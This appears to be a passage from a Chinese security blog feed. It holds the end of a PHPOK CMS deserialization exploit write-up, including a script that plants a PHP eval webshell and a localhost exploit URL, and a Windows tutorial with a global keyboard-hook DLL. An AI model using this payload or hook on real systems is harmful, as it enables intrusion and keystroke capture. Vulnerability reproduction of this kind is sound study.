class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;key_id = <span class="hljs-string">&#x27;shell&#x27;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;key_list = <span class="hljs-string">&#x27;aa&#x27;</span>.base64_encode(<span class="hljs-string">&#x27;&lt;?php eval($_GET[&quot;shell&quot;]);?&gt;&#x27;</span>);<br>        <span class="hljs-keyword">$this</span>-&gt;folder = <span class="hljs-string">&#x27;php://filter/write=convert.base64-decode/resource=&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">token</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$keyid</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$keyc_length</span> = <span class="hljs-number">6</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$keya</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$keyb</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$time</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$expiry</span> = <span class="hljs-number">3600</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">keyid</span>(<span class="hljs-params"><span class="hljs-variable">$keyid</span>=<span class="hljs-string">&#x27;&#x27;</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$keyid</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;keyid;<br>        &#125;<br>        <span class="hljs-keyword">$this</span>-&gt;keyid = strtolower(md5(<span class="hljs-variable">$keyid</span>));<br>        <span class="hljs-keyword">$this</span>-&gt;config();<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;keyid;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">config</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">$this</span>-&gt;keyid)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">$this</span>-&gt;keya = md5(substr(<span class="hljs-keyword">$this</span>-&gt;keyid, <span class="hljs-number">0</span>, <span class="hljs-number">16</span>));<br>        <span class="hljs-keyword">$this</span>-&gt;keyb = md5(substr(<span class="hljs-keyword">$this</span>-&gt;keyid, <span class="hljs-number">16</span>, <span class="hljs-number">16</span>));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">$this</span>-&gt;keyid)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br><br>        <span class="hljs-variable">$expiry_time</span> = <span class="hljs-keyword">$this</span>-&gt;expiry ? <span class="hljs-keyword">$this</span>-&gt;expiry : <span class="hljs-number">365</span>*<span class="hljs-number">24</span>*<span class="hljs-number">3600</span>;<br>        <span class="hljs-variable">$string</span> = sprintf(<span class="hljs-string">&#x27;%010d&#x27;</span>,(<span class="hljs-variable">$expiry_time</span> + time())).substr(md5(<span class="hljs-variable">$string</span>.<span class="hljs-keyword">$this</span>-&gt;keyb), <span class="hljs-number">0</span>, <span class="hljs-number">16</span>).<span class="hljs-variable">$string</span>;<br>        <span class="hljs-variable">$keyc</span> = substr(md5(microtime().rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>)), -<span class="hljs-keyword">$this</span>-&gt;keyc_length);<br>        <span class="hljs-variable">$cryptkey</span> = <span class="hljs-keyword">$this</span>-&gt;keya.md5(<span class="hljs-keyword">$this</span>-&gt;keya.<span class="hljs-variable">$keyc</span>);<br>        <span class="hljs-variable">$rs</span> = <span class="hljs-keyword">$this</span>-&gt;core(<span class="hljs-variable">$string</span>,<span class="hljs-variable">$cryptkey</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$keyc</span>.str_replace(<span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, base64_encode(<span class="hljs-variable">$rs</span>));<br>        <span class="hljs-comment">//return $keyc.base64_encode($rs);</span><br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">core</span>(<span class="hljs-params"><span class="hljs-variable">$string</span>,<span class="hljs-variable">$cryptkey</span></span>)</span>&#123;<br>        <span class="hljs-variable">$key_length</span> = strlen(<span class="hljs-variable">$cryptkey</span>);<br>        <span class="hljs-variable">$string_length</span> = strlen(<span class="hljs-variable">$string</span>);<br>        <span class="hljs-variable">$result</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-variable">$box</span> = range(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>);<br>        <span class="hljs-variable">$rndkey</span> = <span class="hljs-keyword">array</span>();<br><br>        <span class="hljs-comment">// 产生密匙簿</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt;= <span class="hljs-number">255</span>; <span class="hljs-variable">$i</span>++)&#123;<br>            <span class="hljs-variable">$rndkey</span>[<span class="hljs-variable">$i</span>] = ord(<span class="hljs-variable">$cryptkey</span>[<span class="hljs-variable">$i</span> % <span class="hljs-variable">$key_length</span>]);<br>        &#125;<br><br>        <span class="hljs-comment">// 用固定的算法，打乱密匙簿，增加随机性，好像很复杂，实际上并不会增加密文的强度</span><br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++)&#123;<br>            <span class="hljs-variable">$j</span> = (<span class="hljs-variable">$j</span> + <span class="hljs-variable">$box</span>[<span class="hljs-variable">$i</span>] + <span class="hljs-variable">$rndkey</span>[<span class="hljs-variable">$i</span>]) % <span class="hljs-number">256</span>;<br>            <span class="hljs-variable">$tmp</span> = <span class="hljs-variable">$box</span>[<span class="hljs-variable">$i</span>];<br>            <span class="hljs-variable">$box</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$box</span>[<span class="hljs-variable">$j</span>];<br>            <span class="hljs-variable">$box</span>[<span class="hljs-variable">$j</span>] = <span class="hljs-variable">$tmp</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// 核心加解密部分</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$a</span> = <span class="hljs-variable">$j</span> = <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$string_length</span>; <span class="hljs-variable">$i</span>++)&#123;<br>            <span class="hljs-variable">$a</span> = (<span class="hljs-variable">$a</span> + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>;<br>            <span class="hljs-variable">$j</span> = (<span class="hljs-variable">$j</span> + <span class="hljs-variable">$box</span>[<span class="hljs-variable">$a</span>]) % <span class="hljs-number">256</span>;<br>            <span class="hljs-variable">$tmp</span> = <span class="hljs-variable">$box</span>[<span class="hljs-variable">$a</span>];<br>            <span class="hljs-variable">$box</span>[<span class="hljs-variable">$a</span>] = <span class="hljs-variable">$box</span>[<span class="hljs-variable">$j</span>];<br>            <span class="hljs-variable">$box</span>[<span class="hljs-variable">$j</span>] = <span class="hljs-variable">$tmp</span>;<br>            <span class="hljs-variable">$result</span> .= chr(ord(<span class="hljs-variable">$string</span>[<span class="hljs-variable">$i</span>]) ^ (<span class="hljs-variable">$box</span>[(<span class="hljs-variable">$box</span>[<span class="hljs-variable">$a</span>] + <span class="hljs-variable">$box</span>[<span class="hljs-variable">$j</span>]) % <span class="hljs-number">256</span>]));<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$token</span> = <span class="hljs-keyword">new</span> token();<br><span class="hljs-variable">$token</span>-&gt;keyid(<span class="hljs-string">&#x27;123456&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$token</span>-&gt;encode(serialize(<span class="hljs-keyword">new</span> cache));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>运行脚本得到payload</p><p><a href="https://imgbed.cn/preview?id=60208e5f5dc5370001a46220"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/ea1a0588-8774-42f4-9c2a-0fa55ed7e6a0.png" alt="imgbed.cn图床"></a>](<a href="https://imgbed.cn/preview?id=60208e5954a29f0001d1ddfb">https://imgbed.cn/preview?id=60208e5954a29f0001d1ddfb</a>)</p><p>在index_cotrol.php中的phpok_f方法中发现调用decode</p><p><a href="https://imgbed.cn/preview?id=60208e5954a29f0001d1ddfb"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/1e6a2d1e-93dd-4606-b9e9-a7172ee26902.png" alt="imgbed.cn图床"></a></p><p>根据路由规则请求url,token为payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost/phpok/api.php?c=index&amp;f=phpok&amp;token=<span class="hljs-number">478</span>ef<span class="hljs-number">7</span>obit<span class="hljs-number">5</span>nzTBxeDcrCXjGxB<span class="hljs-number">4</span>ifLSKWvkWtVrpSmI<span class="hljs-number">9</span>W<span class="hljs-number">4</span>o<span class="hljs-number">0</span>rjCDuphi<span class="hljs-number">5</span>+PHD<span class="hljs-number">0</span>vNqavv<span class="hljs-number">0</span>lx<span class="hljs-number">0</span>PQ+v/RfRV/CPv<span class="hljs-number">81</span>ncmZb<span class="hljs-number">2</span>RJy<span class="hljs-number">2</span>eYWxxRII<span class="hljs-number">1</span>wSLQ<span class="hljs-number">825</span>xh<span class="hljs-number">7</span>jrjXMPjbAZ<span class="hljs-number">6</span>gUiAuCb<span class="hljs-number">2</span>HSMz/vizU<span class="hljs-number">53</span>Wfc<span class="hljs-number">64</span>OIB/<span class="hljs-number">5</span>FYAH<span class="hljs-number">0</span>OcBENNyngihF<span class="hljs-number">9</span>LNgQ<span class="hljs-number">5</span>pxVQkf<span class="hljs-number">2</span>EAvG<span class="hljs-number">0</span>T<span class="hljs-number">7</span>AbWMb<span class="hljs-number">6</span>prp<span class="hljs-number">0</span>ZTaZ<span class="hljs-number">19</span>SbZdAeKV<span class="hljs-number">3</span>AB<span class="hljs-number">8</span>LApao<span class="hljs-number">8</span>nODRRNLutAwh<span class="hljs-number">5</span>k<span class="hljs-number">6</span>MUefwjD<span class="hljs-number">9</span>lU/Czv<span class="hljs-number">0</span>n/UXAGlIl+asWwzpz<span class="hljs-number">6</span>pMYfHTbIc<span class="hljs-number">5</span>Byug<span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>利用成功</p><p><a href="https://imgbed.cn/preview?id=60208e6534dcf3000102fb90"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/ec806660-0cbe-4b59-959d-bfc31b86d382.png" alt="imgbed.cn图床"></a></p><p>参考：</p><p><a href="https://xz.aliyun.com/t/7852">https://xz.aliyun.com/t/7852</a></p><p><a href="https://www.ghtwf01.cn/index.php/archives/985/">https://www.ghtwf01.cn/index.php/archives/985/</a></p><p><a href="https://www.ghtwf01.cn/index.php/archives/981/">https://www.ghtwf01.cn/index.php/archives/981/</a></p><p><a href="http://althims.com/2020/02/05/phpok-5-4-173/">http://althims.com/2020/02/05/phpok-5-4-173/</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Windows钩子函数</title>
    <link href="/2021/02/05/Windows%E9%92%A9%E5%AD%90%E5%87%BD%E6%95%B0/"/>
    <url>/2021/02/05/Windows%E9%92%A9%E5%AD%90%E5%87%BD%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h1 id="钩子原理"><a href="#钩子原理" class="headerlink" title="钩子原理"></a>钩子原理</h1><p>​    Windows下的应用程序大部分是基于消息模式机制的，一些CUI程序不基于消息。Windows下应用程序都有一个消息函数，根据不同的消息来完成不同的功能。Windows提供的钩子机制是用来截获监视系统中的消息。不同的钩子可以处理不同信息。</p><p>​    钩子分为局部钩子和全局钩子。局部钩子是针对一个线程的，而全局钩子是针对整个操作系统内基于消息机制的应用程序的。全局钩子需要使用DLL文件，DLL文件里存放了钩子函数的代码。</p><p>​    安装全局钩子后，只要进程接收到可以发出钩子的消息后，全局钩子的DLL文件会被操作系统自动或强行的加载到该进程中。由此可见，设置消息钩子也是一种可以进行DLL注入的方法。</p><h1 id="钩子函数"><a href="#钩子函数" class="headerlink" title="钩子函数"></a>钩子函数</h1><p>钩子函数在系统消息触发时被系统调用 。在某个事件触发后，钩子函数捕获它并完成一些操作，是一段用以处理系统消息的程序</p><h1 id="相关API函数"><a href="#相关API函数" class="headerlink" title="相关API函数"></a>相关API函数</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++">LRESULT CALLBACK HookProc  <span class="hljs-comment">//所有的钩子函数都是这种形式</span><br>(<br>  <span class="hljs-keyword">int</span> nCode,<br>  WPARAM wParam,<br>  LPARAM lParam,<br>);<br></code></pre></td></tr></table></figure><p>参数nCode：钩子代码，钩子子程通过该代码来决定执行什么动作。该值取决于钩子的类型，每种类型都拥有自己特有的钩子代码集合。</p><p>参数wParam和<em>lParam</em>的值，都取决于钩子代码。但是一般都包含发送或者传递的消息的信息。</p><h2 id="SetWindowsHookEx"><a href="#SetWindowsHookEx" class="headerlink" title="SetWindowsHookEx"></a>SetWindowsHookEx</h2><p>返回一个钩子句柄</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">HHOOK WINAPI <span class="hljs-title">SetWindowsHookEx</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">  _In_  <span class="hljs-keyword">int</span> idHook,</span></span><br><span class="hljs-function"><span class="hljs-params">  _In_  HOOKPROC lpfn,<span class="hljs-comment">//回调函数，名称任意，参数和返回值数据固定</span></span></span><br><span class="hljs-function"><span class="hljs-params">  _In_  HINSTANCE hMod,<span class="hljs-comment">//为DllMain第一个参数g_Inst=(HMODULE)hModule;</span></span></span><br><span class="hljs-function"><span class="hljs-params">  _In_  DWORD dwThreadId<span class="hljs-comment">//全局钩子设置0</span></span></span><br><span class="hljs-function"><span class="hljs-params">)</span></span>;<br></code></pre></td></tr></table></figure><p>lpfn：指定HOOK函数的地址。如果dwThread参数被设置为0或者被设置为一个进程中的线程ID，则该回调HOOK函数只能在DLL文件中。如果dwThread为当前进程中的线程ID，则这个回调函数可以在当前进程中也可以在DLL中。</p><p>hMod：钩子函数所在模块的句柄。lpfn所在的模块的句柄，如果dwThreadId为当前进程中的线程ID，而且lpfn所指向的函数在当前进程中，那么hMod被设置为NULL</p><p>dwThreadId：需要被挂钩的线程ID号（指定的话为局部钩子），如果设置为0表示在基于消息机制的所有的线程挂钩（全局钩子），如果指定为具体ID好，那么表示要在指定的线程中进行挂钩。这个参数影响上边两个参数的取值，决定了该钩子属于全局钩子还是局部钩子。</p><p>idHook:钩子的类型</p><p><img src="Windows%E9%92%A9%E5%AD%90%E5%87%BD%E6%95%B0.assets/20191231092715762.png" alt="img"></p><h2 id="UnhookWindowsEx"><a href="#UnhookWindowsEx" class="headerlink" title="UnhookWindowsEx"></a>UnhookWindowsEx</h2><p>移除先前用SetWindowsHookEx安装的钩子，</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">UnhookWindowsHookEx</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">  HHOOK hhk            <span class="hljs-comment">//钩子句柄</span></span></span><br><span class="hljs-function"><span class="hljs-params">)</span></span>;<br></code></pre></td></tr></table></figure><p>可以多次反复安装钩子，而且可以安装多个同样类型的钩子。这样会形成一条钩子链，最后安装的钩子会首先截获到消息，当该钩子对消息处理完毕以后会选择返回，或者继续传递消息。通常情况下，为了消息可以传达到目标窗口，我们会选择将消息继续传递</p><h2 id="CallNextHookEx"><a href="#CallNextHookEx" class="headerlink" title="CallNextHookEx"></a>CallNextHookEx</h2><p>使消息继续传递，第一个参数为钩子句柄，后面三个为钩子函数的参数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">LRESULT <span class="hljs-title">CallNextHookEx</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">  HHOOK  hhk,</span></span><br><span class="hljs-function"><span class="hljs-params">  <span class="hljs-keyword">int</span>    nCode,</span></span><br><span class="hljs-function"><span class="hljs-params">  WPARAM wParam,</span></span><br><span class="hljs-function"><span class="hljs-params">  LPARAM lParam</span></span><br><span class="hljs-function"><span class="hljs-params">)</span></span>;<br></code></pre></td></tr></table></figure><h2 id="GetKeyNameText"><a href="#GetKeyNameText" class="headerlink" title="GetKeyNameText"></a>GetKeyNameText</h2><p>GetKeyNameText函数检索表示键的名称的字符串。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">GetKeyNameTextA</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">  LONG  lParam,<span class="hljs-comment">//钩子函数的第三个参数lparam</span></span></span><br><span class="hljs-function"><span class="hljs-params">  LPSTR lpString,<span class="hljs-comment">//接收的缓冲区</span></span></span><br><span class="hljs-function"><span class="hljs-params">  <span class="hljs-keyword">int</span>   cchSize<span class="hljs-comment">//最大大小</span></span></span><br><span class="hljs-function"><span class="hljs-params">)</span></span>;<br></code></pre></td></tr></table></figure><h1 id="键盘钩子实例"><a href="#键盘钩子实例" class="headerlink" title="键盘钩子实例"></a>键盘钩子实例</h1><p>功能为用Messagebox显示按下键的字符。既然要截获键盘消息，那么肯定是截获系统范围内的键盘消息，因此需要安装全局钩子，这样就需要DLL文件支持。</p><p>首先新建DLL文件，定义两个导出函数和两个全局变量</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-comment">//定义导出函数，开始hook和结束hook</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> __declspec(dllexport) <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">SetHookOn</span><span class="hljs-params">()</span></span>;<br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> __declspec(dllexport) <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">SetHookOff</span><span class="hljs-params">()</span></span>;<br><br>HHOOK g_Hook = <span class="hljs-literal">NULL</span>;<br>HINSTANCE g_Inst = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-comment">//重写钩子函数</span><br><span class="hljs-comment">//CallNextHookEx函数表示将当前钩子传递给钩子链中的下一个钩子</span><br><span class="hljs-comment">//第一个参数当前钩子的句柄。如果直接返回0，则表示中断钩子传递</span><br><span class="hljs-comment">//对钩子进行拦截</span><br><span class="hljs-function">LRESULT CALLBACK <span class="hljs-title">KeyboardProc</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">    <span class="hljs-keyword">int</span> code,</span></span><br><span class="hljs-function"><span class="hljs-params">    WPARAM wParam,</span></span><br><span class="hljs-function"><span class="hljs-params">    LPARAM lParam</span></span><br><span class="hljs-function"><span class="hljs-params">)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//进入钩子函数的第一个判断，如果code&lt;0必须调用CallNextHookEx将消息继续传递下去，不对消息进行处理，并返回CallNextHookEx的返回值，MSDN要求。</span><br>    <span class="hljs-keyword">if</span> (code &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> CallNextHookEx(g_Hook, code, wParam, lParam);<br>    &#125;<br><span class="hljs-comment">//如果code等于HC_ACTION，表示消息中含有按键消息，如果为WM_KEYDOWN显示按键对应文本</span><br>    <span class="hljs-keyword">if</span> (code == HC_ACTION &amp;&amp; lParam &gt; <span class="hljs-number">0</span>) &#123;<br>        TCHAR szBuf[MAXBYTE] = &#123; <span class="hljs-number">0</span> &#125;;<br>        GetKeyNameText(lParam, szBuf, MAXBYTE);<br>        MessageBox(<span class="hljs-literal">NULL</span>, szBuf, <span class="hljs-literal">NULL</span>, MB_OK);<br>    &#125;<br>    <span class="hljs-keyword">return</span> CallNextHookEx(g_Hook, code, wParam, lParam);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">SetHookOn</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    g_Hook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_Inst, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">SetHookOff</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    UnhookWindowsHookEx(g_Hook);<br>&#125;<br><br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">( HMODULE hModule,</span></span><br><span class="hljs-function"><span class="hljs-params">                       DWORD  ul_reason_for_call,</span></span><br><span class="hljs-function"><span class="hljs-params">                       LPVOID lpReserved</span></span><br><span class="hljs-function"><span class="hljs-params">                     )</span></span><br><span class="hljs-function"></span>&#123;<br>    g_Inst = (HMODULE)hModule;<br><br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>在DllMain函数中，需要保存该DLL模块的句柄，以方便安装全局钩子</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// MFCKeyboardHookDlg.cpp: 实现文件</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;framework.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;MFCKeyboardHook.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;MFCKeyboardHookDlg.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;afxdialogex.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib,<span class="hljs-meta-string">&quot;KeyboardHook&quot;</span>)</span><br> <br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">SetHookOn</span><span class="hljs-params">()</span></span>;<br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">SetHookOff</span><span class="hljs-params">()</span></span>;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _DEBUG</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> new DEBUG_NEW</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br><br><span class="hljs-comment">// CMFCKeyboardHookDlg 对话框</span><br><br><br><br>CMFCKeyboardHookDlg::CMFCKeyboardHookDlg(CWnd* pParent <span class="hljs-comment">/*=nullptr*/</span>)<br>: CDialog(IDD_MFCKEYBOARDHOOK_DIALOG, pParent)<br>&#123;<br>m_hIcon = AfxGetApp()-&gt;LoadIcon(IDR_MAINFRAME);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">CMFCKeyboardHookDlg::DoDataExchange</span><span 